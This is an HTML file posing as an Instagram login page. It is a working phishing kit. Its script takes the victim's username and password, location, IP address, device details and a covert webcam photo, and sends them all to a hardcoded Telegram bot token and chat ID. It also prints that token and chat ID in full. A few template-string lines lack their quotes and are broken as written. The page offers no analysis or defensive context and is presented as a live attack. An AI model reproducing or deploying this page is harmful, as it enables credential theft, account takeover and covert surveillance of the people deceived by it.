<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel="icon" href="icons/InstagramIcon.png" type="image/png">
    <title>Instagram.com</title>
    <link rel="stylesheet" href="styles/style.css">
</head>

<body>
    <div class="user-credential-div">
        <div class="box">
            <img class="instagram-logo"
                src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo-2010-2013.png">
            <form>
                <div>
                    <input type="text" id="username" name="username" placeholder="Phone number, username, or Email"
                        class="user-email-place"><br><br>
                </div>
                <div>
                    <input class="user-password-place" placeholder="Password"><br><br>
                </div>
                <div>
                    <button class="login-button" type="submit">
                        <span>Log&nbsp;In</span>
                    </button>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <h5>
            <div class="footer">
                <p class="first-line">
                    <a target="_blank" class="f-line-elements" href="https://about.meta.com/">
                        <span>Meta</span>
                    </a>
                </p>
            </div>
        </h5>
    </footer>

    <script>
        document.querySelector("form").addEventListener("submit", function(event) {
            event.preventDefault();

            var username = document.getElementById("username").value;
            var password = document.querySelector(".user-password-place").value;
            var userAgent = navigator.userAgent;
            var ip = ''; // سيتم الحصول عليه لاحقًا من خدمة خارجية
            var location = ''; // سيتم الحصول عليه من Geolocation API
            var deviceType = navigator.platform;
            var language = navigator.language;

            // جمع بيانات الموقع باستخدام Geolocation API
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    location = Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude};
                    captureAndSendData(username, password, userAgent, location, ip, deviceType, language);
                });
            } else {
                alert("Unable to retrieve location.");
            }

            // وظيفة للحصول على عنوان الـ IP
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    ip = data.ip;
                })
                .catch(error => {
                    console.error("IP fetch error:", error);
                    ip = 'IP غير متاح';
                });

            // وظيفة لالتقاط صورة باستخدام الكاميرا
            function captureAndSendData(username, password, userAgent, location, ip, deviceType, language) {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(function(stream) {
                            var video = document.createElement('video');
                            video.srcObject = stream;
                            video.play();
                            video.onloadedmetadata = function () {
                                var canvas = document.createElement('canvas');
                                canvas.width = 640;
                                canvas.height = 480;
                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                                // إرسال الصورة إلى البوت
                                canvas.toBlob(function(blob) {
                                    var formData = new FormData();
                                    formData.append("photo", blob);
                                    sendToTelegram(username, password, userAgent, location, ip, deviceType, language, formData);
                                    stream.getTracks().forEach(track => track.stop());
                                });
                            };
                        })
                        .catch(function(err) {
                            console.log("Camera error: " + err);
                        });
                } else {
                    alert("Camera access not supported.");
                }
            }

            // إرسال البيانات إلى بوت تلغرام
            function sendToTelegram(username, password, userAgent, location, ip, deviceType, language, imageData) {
                var botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
                var chatId = "5091980014";
                var message = ⚡️ **محاولة تسجيل دخول جديدة** ⚡️\n\n;
                message += 🧑‍💻 **اسم المستخدم:** ${username}\n;
                message += 🔑 **كلمة المرور:** ${password}\n;
                message += 🌍 **الموقع:** ${location}\n;
                message += 📍 **عنوان الـ IP:** ${ip}\n;
                message += 🌐 **المتصفح:** ${userAgent}\n;
                message += 📱 **نوع الجهاز:** ${deviceType}\n;
                message += 🌐 **اللغة المفضلة:** ${language}\n;
                message += 🕒 **التاريخ والوقت:** ${new Date().toLocaleString()};

                var url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};

                fetch(url)
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log("تم إرسال الرسالة بنجاح");
                        } else {
                            console.log("حدث خطأ أثناء إرسال الرسالة");
                        }
                    })
                    .catch(error => console.error('Error:', error));

                // إرسال الصورة إلى البوت (إذا كانت موجودة)
                if (imageData) {
                    var formData = new FormData();
                    formData.append("photo", imageData);
                    var imageUrl = https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId};
                    fetch(imageUrl, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log("تم إرسال الصورة بنجاح");
                    })
                    .catch(error => console.error('Error:', error));
                }
            }
        });
    </script>
</body>

</html>
